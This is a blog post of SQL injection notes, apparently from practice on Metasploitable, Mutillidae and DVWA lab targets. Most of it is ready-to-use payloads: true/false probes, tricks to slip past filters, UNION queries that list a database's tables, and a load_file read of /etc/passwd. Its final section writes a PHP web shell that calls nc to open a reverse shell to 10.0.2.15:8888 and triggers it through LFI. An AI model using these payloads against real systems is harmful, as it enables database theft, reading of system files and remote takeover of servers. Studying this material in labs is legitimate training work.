+++
categories = ["Metasploitable", "SQL"]
date = "2021-02-15"
title = "SQL Get Injection"
type = ["posts","post"]
[ author ]
  name = "nazori"
+++


Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.

Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible.


### Tips

* Examples of TRUE statements to discover SQLi
```
aNd 1=1
aNd 21=21
orDeR bY 1
```
* Examples of FALSE statements 
```
dNd 0=1
anD 9=2
ordEr bY 1000000000000
```

* Characters to replace spaces
```
+ 
/**/
%20

> Previous examples:
orDer+bY+1
orDer/**/bY/**/1
orDer%20bY%201

```

* Comment marks for ending requests
```
/*
//
#
%23
``` 

* PD: Sometimes you'll need to add `;` before commenting, examples:
```
anD 1=1//
anD 1=1;//
``` 

#### Medium security

Sometimes the web may  be filtering the URL looking up for special characters. In that case, we can first try to remove the `'` at the error window. Also if we have to enter a literal like `where table = 'that_table'`, we can forget about the quotes and convert it to hex. It can be done with Burp Suite, and it would look something like `where table = 0x345264`.

#### One table at a time

From the following hide request, sometimes we can retrieve only the first table name and not all of them.

`-1'+uNioN/**/seLect/**/table_name,2+fRom+information_schema%23`

Then we have to add the clause `limit 0,1`, where the first number is the table to show and the second the number of table that are going to appear. So we would do several requests like this:

```
-1'+uNioN/**/seLect/**/table_name,2+fRom+information_schema+limit+0,1%23

-1'+uNioN/**/seLect/**/table_name,2+fRom+information_schema+limit+1,1%23

-1'+uNioN/**/seLect/**/table_name,2+fRom+information_schema+limit+2,1%23
```
The `-1` is so the main request doesn't output anything because is wrong.

#### Read and Write Files 

This example is done on a database that has 5 columns. 

* Read
```
admin' union select null, load_file('/etc/passwd'),null,null,null%23
```

* Write 
  
If we try to write on folders like /var/www or so it is possible that we do not have permission.

``` 
admin' union select null,'This is what is going to be written',null,null,null into outputfile '/tmp/example.txt'%23

```

#### Reverse Shell

There have to be a LFI vulnerability in the server we are attacking. This works on a low security server with two columns.

```
-1' union select '<?passthru("nc -w /bin/sh 10.0.2.15 8888");?>',null into outfile '/tmp/reverse_shell.php'%23
```

We then listen in our terminal `nc -vv -l -p 8888`. And go to the LFI vulnerability and locate our file `/?page=/../../../../../tmp/reverse_shell.php`.

This can be done in Mutillidae A6 (LFI) or DVWA File injection.